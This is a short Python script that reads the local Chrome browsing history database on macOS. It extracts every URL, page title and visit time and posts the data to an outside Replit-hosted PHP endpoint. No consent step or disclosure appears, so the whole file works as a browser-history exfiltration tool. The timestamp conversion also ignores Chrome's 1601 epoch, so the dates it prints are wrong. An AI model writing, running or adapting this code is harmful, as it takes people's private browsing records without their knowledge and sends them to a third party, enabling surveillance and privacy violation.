import sqlite3
import os
import datetime
import json
import requests

# Get the path to the user's Chrome history database
data_path = os.path.expanduser('~') + "/Library/Application Support/Google/Chrome/Default"
files = os.listdir(data_path)
history_db = os.path.join(data_path, 'History')

# Establish a connection to the Chrome history database
connection = sqlite3.connect(history_db)
cursor = connection.cursor()

# Retrieve the URL, title, and visit time for each history item
select_statement = "SELECT urls.url, urls.title, visits.visit_time FROM urls, visits WHERE urls.id = visits.url;"
cursor.execute(select_statement)
results = cursor.fetchall()

# Create a list of dictionaries representing each history item
history_items = []
for row in results:
    url = row[0]
    title = row[1]
    timestamp = row[2] / 1000000
    visit_time = datetime.datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S")
    history_items.append({"url": url, "title": title, "visit_time": visit_time})

# Close the database connection
connection.close()

# Send the history data to a PHP script on a Replit server
server_url = "https://vapidplayfuldatamart.dopebope.repl.co/index.php"
payload = {"history": json.dumps(history_items)}
response = requests.post(server_url, data=payload)
if response.status_code == 200:
    print("History data sent to Replit server successfully.")
else:
    print(f"Failed to send history data to Replit server. Response code: {response.status_code}")
